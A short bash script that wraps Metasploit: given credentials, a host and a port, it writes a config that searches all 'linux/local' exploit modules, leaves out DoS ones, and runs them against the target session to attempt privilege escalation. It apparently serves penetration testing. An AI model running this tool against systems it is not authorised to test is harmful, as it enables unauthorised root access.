#!/bin/bash
usage() {
    echo "Usage: $0 <username> <password> <ip> [port] [-e exclude]"
    exit 1
}
[[ "$#" -lt 1 ]] && usage

while [[ "$#" -gt 0 ]];do
    case "$1" in
        "-e") shift; excludes+="$1 "; shift;;
        *)
            if [[ ! "$user" ]];then user="$1"
            elif [[ ! "$pass" ]];then pass="$1"
            elif [[ ! "$host" ]];then host="$1"
            elif [[ ! "$port" ]];then port="$1"
            else usage; fi
            shift
            ;;
    esac
done
[[ "$user" ]] || usage
[[ "$pass" ]] || usage
[[ "$host" ]] || usage
[[ "$port" ]] || port=22

bin="$HOME/.local/share/msf/run.sh"
cnf="$(mktemp -d)/msf-linux-exploit"

cat<<EOF > "$cnf.ftcnf"
:opt
use_name .

:search
type exploit
name linux/local
exclude dos $excludes

:session
RHOSTS $host
RPORT $port
USER $user
PASS $pass

:args
SESSION 1
EOF
$bin "$cnf.ftcnf"
